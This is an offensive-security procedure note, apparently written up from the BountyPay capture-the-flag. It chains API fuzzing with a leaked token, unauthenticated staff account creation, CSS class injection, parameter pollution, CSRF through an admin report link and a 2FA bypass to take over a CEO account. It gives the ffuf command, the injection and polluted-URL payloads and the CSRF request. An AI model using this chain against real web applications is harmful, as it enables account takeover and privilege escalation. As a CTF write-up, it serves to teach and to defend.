---
tags:
  - broken-access-control
  - csrf
  - dom-injection
  - parameter-pollution
  - privilege-escalation
type: procedure
tools:
  - '[[tools/ffuf]]'
  - '[[tools/SecLists]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/ffuf-api-fuzz]]'
  - '[[commands/get-admin-report]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Forge Web Credentials]]'
updated_at: '2025-12-14T17:33:06.027Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 1473be62-4efa-43d0-9e5d-5a20f661a630
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Forge Web Credentials]]'
---
# Create Staff Account and Escalate Privileges via CSRF Injection

## Summary

This procedure uses an extracted API token to create a staff account unauthenticated, then chains CSRF, DOM class injection, and parameter pollution to escalate to admin privileges and takeover the CEO account.

## Description

Fuzzing /api/ discovers /staff for POST creation using staff_id 'STF:KE624RQ2T9'. In the staff app, inject 'avatar2 upgradeToAdmin tab2' as CSS class to trigger JS upgrade. Parameter pollution loads login template with username, auto-clicking via /js/website.js. Report base64 URL to admin for CSRF trigger. Repeat 2FA bypass for CEO.

## Requirements

1. API token from APK
2. Knowledge of staff_id from external sources (e.g., Twitter)
3. Proxy for request crafting

## Defense

Defensive measures and detection strategies:

- Require authentication and CSRF tokens for account creation/upgrade
- Sanitize user inputs for CSS classes and template parameters
- Validate array parameters and prevent pollution

## Objectives

1. Create arbitrary staff account
2. Escalate via chained web vulnerabilities
3. Access CEO account for full takeover

## Instructions

### Step 1: Fuzz API Endpoints

**Context**: Discover staff creation endpoint.

**Command** ([[commands/ffuf-api-fuzz]]):
```bash
ffuf -u "https://api.bountypay.h1ctf.com/api/FUZZ" -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -w ./SecLists/Discovery/Web-Content/common.txt
```

> Expected output: /api/staff discovered.

### Step 2: Create Staff Account

**Context**: POST with arbitrary staff_id.

POST to /api/staff with JSON including staff_id 'STF:KE624RQ2T9', receiving 'sandra.allison' credentials.

> Expected output: New account details.

### Step 3: Inject and Pollute for Escalation

**Context**: Set up chain in staff app.

Update profile avatar to 'avatar2 upgradeToAdmin tab2'. Navigate to ?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2 to load and auto-submit.

### Step 4: Trigger CSRF via Report

**Context**: Lure admin to malicious URL.

**Command** ([[commands/get-admin-report]]):
```bash
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI= HTTP/1.1
```

> Base64 of polluted URL. Expected output: Admin escalation triggered.

### Step 5: Escalate to CEO

**Context**: Use admin access to target marten.mickos.

Bypass 2FA as before.

> Expected output: CEO session.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Forge Web Credentials]] Forge Web Credentials

### Sub-Techniques

- None

## Commands Used

- [[commands/ffuf-api-fuzz]]
- [[commands/get-admin-report]]

## Tools Used

- [[tools/ffuf]]
- [[tools/SecLists]]

## Tags

- broken-access-control
- csrf
- dom-injection
- parameter-pollution
- privilege-escalation
